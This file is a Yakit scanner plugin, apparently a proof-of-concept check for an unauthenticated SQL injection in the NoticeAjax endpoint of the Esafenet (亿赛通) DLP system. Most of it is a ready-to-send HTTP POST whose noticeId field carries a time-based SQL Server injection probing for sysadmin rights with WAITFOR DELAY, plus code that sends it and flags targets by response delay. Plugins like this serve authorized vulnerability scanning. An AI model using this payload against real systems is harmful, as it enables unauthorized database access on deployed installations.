script_name: 亿赛通数据泄露防护(DLP)系统 NoticeAjax 接口SQL注入
content:
# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /CDGServer3/NoticeAjax;Service HTTP/1.1
Host: {{params(target)}}
Cookie: JSESSIONID=99CEC1B294F4EEEA7AFC46D8D4741917; JSESSIONID=06DCD58EDC037F785605A29CD7425C66
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: 
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

command=delNotice&noticeId=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0: 5'--`

	begin_time=time.now()
    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
	poc.timeout(5),
    )
    resp_time=time.Since(begin_time)
    if int(resp_time) > 5000000000{
        yakit.Info("%v found 亿赛通数据泄露防护(DLP)系统 NoticeAjax 接口SQL注入", addr)
        risk.NewRisk(
        addr,
        risk.title("亿赛通数据泄露防护(DLP)系统 NoticeAjax 接口SQL注入"),
        risk.severity("high"),
        risk.titleVerbose("亿赛通数据泄露防护(DLP)系统 NoticeAjax 接口SQL注入"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
